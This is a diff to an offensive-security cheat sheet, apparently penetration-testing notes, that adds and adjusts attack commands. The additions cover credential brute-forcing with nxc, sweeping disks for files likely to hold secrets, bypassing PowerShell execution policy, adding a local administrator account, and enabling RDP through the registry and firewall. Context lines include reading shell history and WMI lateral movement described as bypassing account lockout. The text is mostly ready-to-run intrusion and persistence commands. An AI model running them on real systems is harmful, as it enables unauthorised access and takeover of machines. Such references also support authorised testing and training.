@@ -225,6 +225,7 @@ with rsa private key, over port 10000
 ### nxc
 	nxc <proto> 123.123.123.123 --port 8000 -u <filename|name> -p <filename|name> --continue-on-success
 Bruteforce usernames and passwords via the protocol on port 8000  
+Add `--no-brute-force` with userfile and passfile to iterate user1:pass1, user2:pass2, etc.  
 
 ### SMB
 	smbclient -L //123.123.123.123 -U username%password
@@ -293,7 +294,7 @@ Write clipboard into file
 List all users and their groups  
 
 ## Windows - search
-	Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.rtf -File -Recurse -ErrorAction SilentlyContinue
+	Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.rtf,*.log -File -Recurse -ErrorAction SilentlyContinue
 Search for any file with .kdbx extension  
 
 ## Windows - check env
@@ -383,6 +384,22 @@ Event ID 4104 in App-Log>Microsoft/Windows/Powershell/Operational.
 ## Windows - impersonate token
 	https://www.offsec.com/metasploit-unleashed/fun-incognito/
 
+## Windows - ExecutionPolicy
+	Set-ExecutionPolicy Bypass -Scope Process -Force
+
+## Windows - add new admin user
+	net user "Username" "Password" /add
+	net localgroup administrators "Username" /add
+
+## Windows - enable RDP
+	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+	Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+powershell  
+
+	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+cmd  
+
 ## Linux - file transfer
 	cat filename | base64 -w 0;echo
 Convert file into clipboard contents  
@@ -459,7 +476,7 @@ Generate passhash with `openssl passwd <password>`
 	history
 .  
 
-cat ~/.bash_history
+	cat ~/.bash_history
 
 ## Linux - env
 	env
@@ -560,6 +577,7 @@ listen for smb connections and relay them to 123.123.123.130 and execute command
 # STAGE 4 - LATERAL MOVEMENT
 ## CMD wmi
 	wmic /node:123.123.123.123 /user:user /password:password process call create "powershell -e ..."
+Bypasses account lockout restrictions  
 
 ## Powershell CimSession
 	$secureString = ConvertTo-SecureString 'password' -AsPlaintext -Force
